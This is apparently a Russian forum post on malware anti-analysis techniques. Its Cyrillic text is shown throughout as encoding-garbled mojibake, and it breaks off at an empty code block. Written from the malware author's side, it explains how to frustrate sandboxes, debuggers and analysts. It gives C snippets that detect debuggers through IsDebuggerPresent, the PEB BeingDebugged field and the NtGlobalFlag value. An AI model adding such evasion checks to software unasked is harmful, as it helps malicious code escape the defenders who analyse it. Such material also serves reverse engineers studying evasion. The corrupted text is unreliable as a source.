–¢–µ—Ö–Ω–∏–∫–∏ –∞–Ω—Ç–∏–∞–Ω–∞–ª–∏–∑–∞ - —ç—Ç–æ –º–µ—Ç–æ–¥—ã, –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞—é—â–∏–µ –¥–µ—è—Ç–µ–ª—å–Ω–æ—Å—Ç—å —Å–ø–µ—Ü–∏–∞–ª–∏—Å—Ç–æ–≤ –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∫–æ–º–∞–Ω–¥—ã blue team) –ø–æ —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—é –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –∏ –ø–æ–∏—Å–∫—É —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏—Ö –∏–ª–∏ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏—Ö —Å–∏–≥–Ω–∞—Ç—É—Ä –∏ IoC. –ü–æ—Å–∫–æ–ª—å–∫—É —ç—Ç–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –æ–±—Ä–∞–∑—Ü–∞, –∫–æ–≥–¥–∞ –æ–Ω –≤–Ω–æ–≤—å –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç—Å—è –≤ —Å—Ä–µ–¥–µ.<br />
<br />
–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ —Å –±–æ–ª—å—à–∏–º –±—é–¥–∂–µ—Ç–æ–º –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å, –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ, –∏–º–µ—é—Ç –±–æ–ª—å—à–µ —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–æ–≤, —Ç–∞–∫–∏—Ö –∫–∞–∫ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º, —á—Ç–æ–±—ã —Å–æ–±–∏—Ä–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –±–∏–Ω–∞—Ä–Ω—ã—Ö —Ñ–∞–π–ª–∞—Ö, –∞–Ω–∞–ª–∏–∑–∏—Ä—É—è –∏—Ö. –í —Ü–µ–ª–æ–º, –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –≤—Å–µ–≥–¥–∞ –Ω–∞–π–¥—É—Ç —Å–ø–æ—Å–æ–± –¥–µ–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û, <b><u>–ø–æ—ç—Ç–æ–º—É —Ü–µ–ª—å —Ç–µ—Ö–Ω–∏–∫ –∞–Ω—Ç–∏–∞–Ω–∞–ª–∏–∑–∞ - —É—Å–ª–æ–∂–Ω–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å –∞–Ω–∞–ª–∏–∑–∞.</u></b><br />
<br />
–° –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ —Å –º–µ–Ω—å—à–∏–º –±—é–¥–∂–µ—Ç–æ–º –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –±—É–¥—É—Ç –±–æ–ª—å—à–µ –ø–æ–ª–∞–≥–∞—Ç—å—Å—è –Ω–∞ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã, –∏ –ø–æ—ç—Ç–æ–º—É —Ç–µ—Ö–Ω–∏–∫–∏ –∞–Ω—Ç–∏–∞–Ω–∞–ª–∏–∑–∞ –º–æ–≥—É—Ç –±—ã—Ç—å –±–æ–ª–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º–∏ –≤ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏–∏ —Å–≤–æ–µ–π —Ü–µ–ª–∏.<br />
<br />
–†–∞—Å—Å–º–æ—Ç—Ä–∏–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –∞–Ω–∞–ª–∏–∑–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º:<br />
<br />
<b>–ü–µ—Å–æ—á–Ω–∏—á–Ω—ã–µ —Å—Ä–µ–¥—ã</b><br />
<br />
–ü–æ–Ω–∏–º–∞–Ω–∏–µ –ø–µ—Å–æ—á–Ω–∏—á–Ω–æ–π —Å—Ä–µ–¥—ã –∂–∏–∑–Ω–µ–Ω–Ω–æ –≤–∞–∂–Ω–æ, –µ—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø—Ä–∏–º–µ–Ω—è—Ç—å —Å–∏–ª—å–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏ –∞–Ω—Ç–∏–∞–Ω–∞–ª–∏–∑–∞.<br />
<br />
<b>–ü–µ—Å–æ—á–Ω–∏—Ü–∞</b> - —ç—Ç–æ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å—Ä–µ–¥–∞, –ø–æ–∑–≤–æ–ª—è—é—â–∞—è –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ –±–µ–∑ –≤–æ–∑–¥–µ–π—Å—Ç–≤–∏—è –Ω–∞ —Ö–æ—Å—Ç-—Å–∏—Å—Ç–µ–º—É. –£ –ø–µ—Å–æ—á–Ω–∏—Ü –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–∏–º–µ–Ω–µ–Ω–∏–π –≤–Ω–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—Å—É–∂–¥–∞—Ç—å—Å—è –Ω–µ –±—É–¥—É—Ç.<br />
<br />
–í –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø–µ—Å–æ—á–Ω–∏—Ü—ã –ø–æ–∑–≤–æ–ª—è—é—Ç –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—è–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥–µ –±–µ–∑ —É—â–µ—Ä–±–∞ –¥–ª—è —Ö–æ—Å—Ç–∞. –ù–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–∏–º–µ—Ä–æ–≤ –ø–µ—Å–æ—á–Ω–∏—Ü: Cuckoo Sandbox, Any.run –∏ Crowdstrike Sandbox.<br />
<br />
<b>–ê–Ω–∞–ª–∏–∑ —á–µ—Ä–µ–∑ –æ—Ç–ª–∞–¥–∫—É </b><br />
<br />
–û—Ç–ª–∞–¥–∫–∞ –∫–æ–¥–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –µ–≥–æ —à–∞–≥ –∑–∞ —à–∞–≥–æ–º, –Ω–∞–±–ª—é–¥–∞—è –∑–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è–º–∏ –≤ –æ–±–ª–∞—Å—Ç–∏ –ø–∞–º—è—Ç–∏, –∏–∑–º–µ–Ω–µ–Ω–∏—è–º–∏ –∑–Ω–∞—á–µ–Ω–∏–π –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –∏ —Ç. –¥. –≠—Ç–æ —Å–ø–æ—Å–æ–±—Å—Ç–≤—É–µ—Ç –ª—É—á—à–µ–º—É –ø–æ–Ω–∏–º–∞–Ω–∏—é –Ω–∞–º–µ—Ä–µ–Ω–∏–π –∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û, —É–ø—Ä–æ—â–∞—è –ø—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–∞–≤–∏–ª –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –¥–ª—è –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –≤ –≤–æ–ø—Ä–æ—Å–µ.<br />
<br />
–¢–µ—Ö–Ω–∏–∫–∏ –∞–Ω—Ç–∏–æ—Ç–ª–∞–¥–∫–∏ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –Ω–∞–ª–∏—á–∏—è –æ—Ç–ª–∞–¥—á–∏–∫–∞ –∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –±–µ–∑–≤—Ä–µ–¥–Ω–æ–≥–æ –ª–æ–∂–Ω–æ–≥–æ –∫–æ–¥–∞, –¥–µ–ª–∞—è –ø—Ä–æ—Ü–µ—Å—Å –æ—Ç–ª–∞–¥–∫–∏ –Ω–µ—ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–≤–µ—Ä—à–µ–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –∫–æ–¥–∞, —á—Ç–æ–±—ã –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –æ—Ç–ª–∞–¥–∫—É.<br />
<br />
<b>–ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Ä–µ–≤–µ—Ä—Å-–∏–Ω–∂–∏–Ω–∏—Ä–∏–Ω–≥–∞</b> <b>–≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û</b><br />
<br />
–°–∞–º—ã–µ –ø–æ–ø—É–ª—è—Ä–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Ä–µ–≤–µ—Ä—Å-–∏–Ω–∂–∏–Ω–∏—Ä–∏–Ω–≥–∞ –¥–ª—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω—ã –Ω–∏–∂–µ:<br />
<br />
<b>Ghidra;<br />
Ida;<br />
xdbg<br />
<br />
–ê–Ω–∞–ª–∏–∑ —á–µ—Ä–µ–∑ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ —Å—Ä–µ–¥—ã</b><br />
<br />
–í–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ —Å—Ä–µ–¥—ã - —ç—Ç–æ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å—Ä–µ–¥—ã, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—é—â–∏–µ –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Ä–µ–¥—É –¥–ª—è —Ä–∞–±–æ—Ç—ã –ø—Ä–æ–≥—Ä–∞–º–º–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π. –í–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å—Ä–µ–¥—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –æ—Ç–ª–∞–¥–∫–∏ –∏ –∞–Ω–∞–ª–∏–∑–∞ –æ–±—Ä–∞–∑—Ü–æ–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û, –¥–µ–ª–∞—è –µ–≥–æ –±–µ–∑–æ–ø–∞—Å–Ω–µ–µ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞, —á–µ–º –≤ —Ä–µ–∞–ª—å–Ω—ã—Ö —Å–µ—Ç—è—Ö.<br />
<br />
–ü–µ—Å–æ—á–Ω–∏—Ü—ã —Ç–∞–∫–∂–µ —Å—á–∏—Ç–∞—é—Ç—Å—è –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π —Å—Ä–µ–¥–æ–π, —Ö–æ—Ç—è –æ–Ω–∏ –Ω–µ –ø–æ–∑–≤–æ–ª—è—é—Ç –∞–Ω–∞–ª–∏—Ç–∏–∫–∞–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –∏–º–µ—Ç—å –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ, —Ç–æ–≥–¥–∞ –∫–∞–∫ –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–∞—è –≤–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è —Å—Ä–µ–¥–∞ –ø–æ–∑–≤–æ–ª—è–µ—Ç. –î–≤–∞ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º–Ω—ã—Ö –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –¥–ª—è –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏: VMware –∏ VirtualBox.<br />
<br />
–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞ –≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π —Å—Ä–µ–¥–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –∏–∑–±–µ–≥–∞–µ–º–æ, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∞–Ω–∞–ª–∏—Ç–∏–∫–∞–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º —Ä–∞–∑–±–∏—Ä–∞—Ç—å –∫–æ–¥ –∏ –ø–∏—Å–∞—Ç—å –ø—Ä–∞–≤–∏–ª–∞ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –¥–ª—è –Ω–µ–≥–æ.<br />
<br />
–¢–µ—Ö–Ω–∏–∫–∏ –ø—Ä–æ—Ç–∏–≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö —Å—Ä–µ–¥ –±—É–¥–µ—Ç –æ–±—Å—É–∂–¥–∞—Ç—å—Å—è –≤ —Å–ª–µ–¥—É—é—â–µ–π —Å—Ç–∞—Ç—å–µ<br />
<br />
<b>–î–∞–≤–∞–π—Ç–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–µ—Ç–æ–¥–æ–≤ –∞–Ω—Ç–∏-–æ—Ç–ª–∞–¥–∫–∏:<br />
<br />
–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º IsDebuggerPresent </b><br />
<br />
–û–¥–∏–Ω –∏–∑ —Å–∞–º—ã—Ö –ø—Ä–æ—Å—Ç—ã—Ö –º–µ—Ç–æ–¥–æ–≤ –∞–Ω—Ç–∏-–æ—Ç–ª–∞–¥–∫–∏ - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI IsDebuggerPresent. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ –∫ –≤—ã–∑—ã–≤–∞—é—â–µ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É –ø–æ–¥–∫–ª—é—á–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫, –∏ FALSE, –µ—Å–ª–∏ –Ω–µ—Ç. –ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞, –ø–æ–∫–∞–∑—ã–≤–∞—é—â–∏–π –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –æ—Ç–ª–∞–¥—á–∏–∫–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (IsDebuggerPresent()) {
  printf(&quot;[i] IsDebuggerPresent –æ–±–Ω–∞—Ä—É–∂–∏–ª –æ—Ç–ª–∞–¥—á–∏–∫ \n&quot;);
  // –ó–∞–ø—É—Å—Ç–∏—Ç—å –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –∫–æ–¥..
}</code></pre>
	</div>
</div><br />
<b>–ó–∞–º–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏ IsDebuggerPresent</b><br />
<br />
–í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ IsDebuggerPresent WinAPI –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª–µ–Ω –¥–∞–∂–µ –≤ —Ç–æ–º —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ –æ–Ω —Ö–æ—Ä–æ—à–æ —Å–∫—Ä—ã—Ç —á–µ—Ä–µ–∑ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ API. WinAPI —Å—á–∏—Ç–∞–µ—Ç—Å—è –æ—á–µ–Ω—å –±–∞–∑–æ–≤—ã–º —Å–ø–æ—Å–æ–±–æ–º –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤ –∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–æ–π–¥–µ–Ω —Å –ø–æ–º–æ—â—å—é –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤, —Ç–∞–∫–∏—Ö –∫–∞–∫ ScyllaHide, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –ø–ª–∞–≥–∏–Ω–æ–º –¥–ª—è xdbg, –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–Ω—ã–º –¥–ª—è –æ–±—Ö–æ–¥–∞ –∞–Ω—Ç–∏-–æ—Ç–ª–∞–¥–∫–∏.<br />
<br />
–ë–æ–ª–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º –ø–æ–¥—Ö–æ–¥–æ–º —è–≤–ª—è–µ—Ç—Å—è —Å–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π –≤–µ—Ä—Å–∏–∏ —Ñ—É–Ω–∫—Ü–∏–∏ IsDebuggerPresent WinAPI. –ù–∞–ø–æ–º–Ω–∏–º –æ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ PEB (Process Environment Block), –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç —á–ª–µ–Ω BeingDebugged, <b>—É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º—ã–π –≤ 1, –∫–æ–≥–¥–∞ –ø—Ä–æ—Ü–µ—Å—Å –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–µ–∂–∏–º–µ –æ—Ç–ª–∞–¥–∫–∏. </b><br />
–ü—Ä–æ—Å—Ç–∞—è –∑–∞–º–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏ IsDebuggerPresent WinAPI –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è –ø—Ä–æ–≤–µ—Ä–∫—É –∑–Ω–∞—á–µ–Ω–∏—è BeingDebugged, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–∏–∂–µ.<br />
<br />
–§—É–Ω–∫—Ü–∏—è IsDebuggerPresent2 –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ —ç–ª–µ–º–µ–Ω—Ç BeingDebugged —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ 1.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL IsDebuggerPresent2() {

  // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PEB
#ifdef _WIN64
    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));
#endif// –ü—Ä–æ–≤–µ—Ä–∫–∞ —ç–ª–µ–º–µ–Ω—Ç–∞ &#039;BeingDebugged&#039;
  if (pPeb-&gt;BeingDebugged == 1)
    return TRUE;

   return FALSE;
}</code></pre>
	</div>
</div><br />
–î—Ä—É–≥–æ–π —Å–ø–æ—Å–æ–± —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π –≤–µ—Ä—Å–∏–∏ —Ñ—É–Ω–∫—Ü–∏–∏ IsDebuggerPresent WinAPI –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –Ω–µ—É–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Ñ–ª–∞–≥–∞ NtGlobalFlag, –∫–æ—Ç–æ—Ä—ã–π —Ç–∞–∫–∂–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ PEB. –≠–ª–µ–º–µ–Ω—Ç NtGlobalFlag —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ 0x70 (—à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ), –µ—Å–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–µ–∂–∏–º–µ –æ—Ç–ª–∞–¥–∫–∏, –≤ –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ –æ–Ω —Ä–∞–≤–µ–Ω 0. –í–∞–∂–Ω–æ –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —ç–ª–µ–º–µ–Ω—Ç NtGlobalFlag —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ 0x70 —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –æ—Ç–ª–∞–¥—á–∏–∫–æ–º. –ü–æ—ç—Ç–æ–º—É —ç—Ç–æ—Ç –º–µ—Ç–æ–¥ –Ω–µ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –æ—Ç–ª–∞–¥—á–∏–∫, –µ—Å–ª–∏ –æ–Ω –±—ã–ª –ø–æ–¥–∫–ª—é—á–µ–Ω –ø–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞.<br />
<br />
–ó–Ω–∞—á–µ–Ω–∏–µ 0x70 –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∏–∑ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ —Å–ª–µ–¥—É—é—â–∏—Ö —Ñ–ª–∞–≥–æ–≤:<br />
<br />
FLG_HEAP_ENABLE_TAIL_CHECK - 0x10<br />
FLG_HEAP_ENABLE_FREE_CHECK - 0x20<br />
FLG_HEAP_VALIDATE_PARAMETERS - 0x40<br />
<br />
–§—É–Ω–∫—Ü–∏—è IsDebuggerPresent3 –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ —ç–ª–µ–º–µ–Ω—Ç NtGlobalFlag —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ 0x70.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10#define FLG_HEAP_ENABLE_FREE_CHECK   0x20#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

BOOL IsDebuggerPresent3() {

  // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PEB
#ifdef _WIN64
    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));
#endif// –ü—Ä–æ–≤–µ—Ä–∫–∞ —ç–ª–µ–º–µ–Ω—Ç–∞ &#039;NtGlobalFlag&#039;
  if (pPeb-&gt;NtGlobalFlag == (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS))
    return TRUE;

  return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º NtQueryInformationProcess</b><br />
<br />
–°–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtQueryInformationProcess –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤ —Å –ø–æ–º–æ—â—å—é –¥–≤—É—Ö —Ñ–ª–∞–≥–æ–≤: ProcessDebugPort –∏ ProcessDebugObjectHandle.<br />
<br />
–ù–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ NtQueryInformationProcess –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
